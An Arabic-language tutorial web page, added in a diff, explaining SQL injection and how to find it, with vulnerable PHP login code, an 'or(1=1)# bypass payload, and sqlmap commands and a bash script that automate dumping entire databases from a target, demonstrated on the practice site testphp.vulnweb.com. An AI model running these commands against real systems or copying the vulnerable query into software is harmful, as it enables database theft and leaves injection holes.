@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
+        <link rel="stylesheet" href="../../assets/css/styles.css">
+        <link rel="shortcut icon" type="image/png" href="../../assets/img/hacker.png">
+        <title>Find SQLi</title>
+    </head>
+    <body>
+
+        <a href="#" class="scrolltop" id="scroll-top">
+            <i class='bx bx-chevron-up scrolltop__icon'></i>
+        </a>
+        
+        <header class="l-header" id="header">
+            <nav class="nav bd-container">
+                <a href="../../index.html" class="nav__logo">Ahmed Hamza</a>
+                <div class="nav__menu" id="nav-menu">
+                    <ul class="nav__list">
+                        <li class="nav__item"><a href="../../index.html" class="nav__link">Home</a></li>
+                        <li class="nav__item"><a href="../../writeups/writeups.html" class="nav__link ">Writeups</a></li>
+                        <li class="nav__item"><a href="../../tutorials/tutorials.html" class="nav__link active-link">Tutorials</a></li>
+                        <li class="nav__item"><a href="../../it-project/it-project.html" class="nav__link">IT-Project</a></li>
+                        <li><i class='bx bx-moon change-theme' id="theme-button"></i></li>
+                    </ul>
+                </div>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class='bx bx-menu'></i>
+                </div>
+            </nav>
+        </header>
+
+        <main class="l-main">
+        <section class="menu section bd-container">
+            <h2 class="section-title">SQLi طريقة اكتشاف ثغرة</h2>
+            <div>
+
+<p dir="rtl">
+السلام عليكم , 
+<br>
+شرح طريقة اكتشاف ثغرة SQLi باستخدام مجموعة ادوات [waybackurls - gf - sqlmap] : 
+<br>
+<br>
+
+ما هي لغة SQL ؟
+<br>
+لغة SQL اختصار الى Structured Query Language وهي لغة برمجية قياسية لإدارة قواعد البيانات، وتستخدم للاستعلام عن البيانات وإدراجها وتحديثها وتعديلها.
+<br>
+<br>
+ما هي ثغرة SQL Injection ؟
+<br>
+تحدث ثغرة SQLi عندما لايتم تصفية مدخلات المستخدم للرموز الخاصة التي يتم ادراجها داخل جملة الاستعلام select او Insert ...  والتي يمكن ان تؤدي الى التلاعب بهذه الجملة المدخلة لقاعدة البيانات  
+</p>
+<br>
+<img src="pic/sqli-2.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<p dir="rtl">
+تكون الثغرة عندما يتم ارسال مدخلات خبيثة للسيرفر من اجل التلاعب بجملة الاستعلام Select : 
+<br>
+سيتم التلاعب بجملة الاستعلام select وتخطي التحقق من الباسوورد وادخال قيمة منطقية صحيحة هي 1=1 اي ان الجملة True وفي النهاية وضع تعليق # لاغلاق جملة الاستعلام وتخطي التحقق من الباسوورد لاي مستخدم.
+</p>
+<pre class="code">
+ #Collect Form Data After Submitting :
+ $username = $_POST["username"];
+ $password = $_POST["password"];
+
+ #Vulnerable Code :
+ $sql = " select * from users where username='$username' and password='$password' ";
+
+ #Exploit : Login Form
+ Username : admin
+ Password : 'or(1=1)#
+
+ $sql = " select * from users where username='admin' and password=''or(1=1)#' ";
+</pre>
+<br>
+
+<p dir="rtl">
+تطبيق عملي على موقع حقيقي vulnweb.com :
+<br>
+<br>
+اولا : شرح الادوات :
+</p>
+<pre class="code-ar" dir="rtl">
+ 1. تقوم اداة waybackurls بجمع كل العناوين URLs الخاصة بالموقع مع كل المجالات الفرعية
+
+ 2. تقوم اداة sort -u بفلترة العناوين المكررة 
+
+ 3. تقوم اداة tee -a باخراج النتائج في ملف
+
+ 4. امر  pipe  (|)  لإعادة توجيه المخرجات والنتائج من برنامج إلى آخر   
+
+ 5. تقوم اداة gf sqli بفلترة العناوين مع الباراميتر التي تقبل المدخلات مثل [https://target.com?id=1]
+
+ 6. تقوم اداة sqlmap باختبار الباراميتر اذا كان مصاب , وتقوم ايظا بأتمتت الاستغلال وسحب قاعدة البيانات او التعديل عليها او حذفها نهائيا  
+
+ 7. عند استخدام امر sqlmap --dump-all سيتم سحب محتويات قاعدة البيانات كاملة 
+ 
+ 8. عند استخدام امر      sqlmap --dbs سيتم استغلال الثغرة وعرض اسماء قواعد البيانات المستخدمة في الموقع
+  
+ 9. عند استخدام امر    sqlmap --batch ستقوم الاداة باستخدام الاعدادات الافتراضية حتى تنتهي من استغلال الثغرة 
+</pre>
+<br>
+<p dir="rtl">
+تنزيل الادوات باتباع الخطوات التالية بالترتيب :
+<br>
+</p>
+
+<pre class="code">
+  sudo apt install golang-go  
+  go get github.com/tomnomnom/waybackurls  
+  go get -u github.com/tomnomnom/gf  
+  cd ~/  
+  git clone https://github.com/1ndianl33t/Gf-Patterns  
+  mkdir .gf  
+  mv ~/Gf-Patterns/*.json ~/.gf  
+  rm -rf ~/Gf-Patterns/  
+  sudo apt install sqlmap
+</pre>
+
+<br>
+<p dir="rtl">
+لتستطيع تشغيل الادوات من الترمنال مباشرة قم بنقل الاداوت الى المسار التالي :
+</p>
+
+<pre class="code">
+  cd ~/go/bin/  
+  sudo cp waybackurls gf /usr/bin  
+</pre>
+<br>
+<p dir="rtl">
+في الشرح السابق حول اداة EyeWitness قمنا باستخراج كل المجالات الفرعية لموقع vulnweb.com الخاص بالتدرب على اكتشاف الثغرات, 
+<br>
+الان سنقوم بفحص المجال الفرعي http://testphp.vulnweb.com لاكتشاف ثغرة SQLi :
+</p>
+<br>
+<img src="pic/vulnweb.png" width="100%" height="100%" alt="Image Is Not Found ...">
+
+<br>
+<br>
+<br>
+<p dir="rtl">
+1. استخدام اداة waybackurls مع اسم الموقع لاستخراج كل العناوين والباراميترات التابعة للمجال الفرعي 
+<br>
+2. بعد ذالك تمرير الروابط او العناوين الى اداة gf sqli لفلترة العناوين مع الباراميتر التي تقبل المدخلات
+<br>
+3. بعد ذالك تمرير كل العناوين الى اداة sqlmap لاكتشاف الثغرة وسحب قاعدة البيانات بالكامل 
+</p>
+<pre class="code">
+  waybackurls http://testphp.vulnweb.com  | sort -u >> waybackdata.txt 
+  cat  waybackdata.txt | gf sqli | tee -a sqli.txt 
+  sqlmap -m sqli.txt --dbs --batch
+  OR
+  sqlmap -m sqli.txt --dump-all --batch
+</pre>
+<br>
+<img src="pic/sqlmap-1.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<img src="pic/sqlmap-2.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+
+<p dir="rtl"> 
+لاحظ بعد اكتشاف الثغرة في احد الباراميترات , قامت الاداة بسحب قاعدة البيانات وكل محتوياتها من جداول وحقول وحفظ كل النتائج في مجلد 
+</p>
+<br>
+<img src="pic/sqlmap-3.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<img src="pic/sqlmap-4.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<img src="pic/sqli-7.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<p dir="rtl">
+سنقوم ببرمجة سكربت بلغة Bash لأتمتة كل الاوامر السابقة في امر واحد : 
+</p>
+<pre class="code">
+ Bash Script : script.sh
+ ========================
+ #!/bin/bash
+ 
+ waybackurls $1 | sort -u >> waybackdata.txt
+ cat  waybackdata.txt | gf sqli | tee -a sqli.txt 
+ sqlmap -m sqli.txt --dump-all --batch
+ =========================
+</pre>
+<br>
+<p dir="rtl">
+نقوم باعطاء السكربت صلاحيات التنفيذ : 	
+</p>
+<pre class="code"> sudo chmod +x script.sh  </pre>
+<br>
+<p dir="rtl">
+تنفيذ السكربت مع عنوان المجال الفرعي :
+</p>
+
+<pre class="code">
+ Example :
+ ./script.sh target.com
+ ./script.sh testphp.vulnweb.com
+</pre>
+<br>
+<img src="pic/sqlmap-5.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<img src="pic/sqlmap-6.png" width="100%" height="100%" alt="Image Is Not Found ...">
+<br>
+<br>
+<br>
+<p dir="rtl">
+المراجع :
+</p>
+<pre class="code">
+ https://portswigger.net/web-security/sql-injection 
+ https://owasp.org/www-community/attacks/SQL_Injection 
+ https://github.com/s0wr0b1ndef/PayloadsAllTheThings/tree/master/SQL%20injection 
+ https://www.w3schools.com/php/func_mysqli_real_escape_string.asp 
+</pre>
+</div>
+</section>
+</main>
+
+<footer class="footer section bd-container">
+
+</footer>
+
+<script src="https://unpkg.com/scrollreveal"></script>
+<script src="../../assets/js/main.js"></script>
+
+
+</body>
+</html>
